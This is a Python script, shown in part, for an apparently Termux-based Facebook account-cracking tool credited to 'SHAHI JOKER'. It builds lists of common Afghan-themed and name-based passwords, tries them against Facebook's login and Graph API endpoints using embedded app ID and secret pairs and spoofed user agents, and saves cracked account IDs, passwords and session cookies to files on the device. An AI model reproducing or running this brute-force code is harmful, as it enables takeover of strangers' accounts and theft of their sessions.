...
\033[1;39m======================================================
  [\x1b[1;95m+\x1b[1;97m] AUTHOR :🥀... 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑...🥀
  [\x1b[1;95m+\x1b[1;97m] GITHUB : 👉🏻🤡  𝐌𝐑 𝐉𝐎𝐊𝐄𝐑
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : 🥀... 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑...🥀 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : 𝐇𝐃 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎                       
...
def menu1():
	...
	if psx in ["1", "01","11","A","a"]:
		...
		if passx in ["2", "02","22","B","a"]:
			...
			plist.append('afghanistan')
			plist.append('Afghanistan1')
			plist.append('Afghanistan12')
			plist.append('Afghanistan123')
			plist.append('Afghanistan1234')
			plist.append('Afghanistan12345')
			plist.append('Afghanistan123456')
			plist.append('khankhan')
			plist.append('Khan12')
			plist.append('Khan12@#')
			plist.append('Khan@#')
			plist.append('Arman123')
			plist.append('Afghan12')
			plist.append('Afghan123')
			plist.append('Afghan1234')
			plist.append('Afghan12345')
			plist.append('Afghan123456')
			plist.append('JanJan')
		if passx in ["3", "03","33","C","c"]:
			plist.append('Jan123')
			plist.append('Khan500600')
			plist.append('100200')
			plist.append('10002000')
			plist.append('pubg123')
			plist.append('pubg1234')
			plist.append('pubg12345')
			plist.append('pubg12346')
			plist.append('pubg100200')
			plist.append('786786')
			plist.append('500600')
			...
			plist.append('KingAfghan')
			plist.append('Afghan King')
			plist.append('afghanistan1')
			plist.append('afghanistan12')
			plist.append('afghanistan123')
			plist.append('afghanistan1234')
			plist.append('afghanistan12345')
			plist.append('afghanistan123456')
			plist.append('pubgpubg')
			plist.append('kingpubg')
		...
		try:
			...
			psl=1
		print(f"{W}{40*'='}");print(f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}afghan100200{W}');print (40*"=")
		for ox in range(psl):
...
def normalfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}JOKER-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		...
		if 'c_user' in logx:
			...
			print(f'\r\r{G}[JOKER-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/JOKER-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[JOKER-2F] {id} | {psw}{W}')
			open('/sdcard/JOKER-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
			...
			if 'y' in cpx:
				print(f'\r\r{R}[JOKER-CP] {id} | {psw}{W}')
			open('/sdcard/JOKER-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}JOKER-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua1()
...
def graphfl2(id,psd,name,tid):
	...
	try:
		...
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}JOKER-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua3()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		...
		if 'Please Confirm Email' in logx:
			...
			if 'y' in cpx:
				print(f'\r\r{R}[JOKER-CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/JOKER-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
...
def nrmlrm(id,psd,tid,mytd):
	...
	for psw in psd:
		...
		if 'c_user' in lcki:
			...
			iid = coki[151:166]
			print(f'\r\r{G}[JOKER-OK] {iid} | {psw}{W}')
			if 'y' in cokix:
				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			ok.append(id)
			open('/sdcard/JOKER-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
			iid = coki[141:156]
			if 'y' in cpx:
				print(f'\r\r{R}[JOKER-CP] {iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/JOKER-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{S}[JOKER-2F] {iid} | {psw}{W}')
			open('/sdcard/JOKER-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
...
def apirm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in jsn:
			print(f'\r\r{G}[JOKER-OK] {iid} | {psw}{W}')
			ok.append(id);open('/sdcard/JOKER-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[JOKER-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/JOKER-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
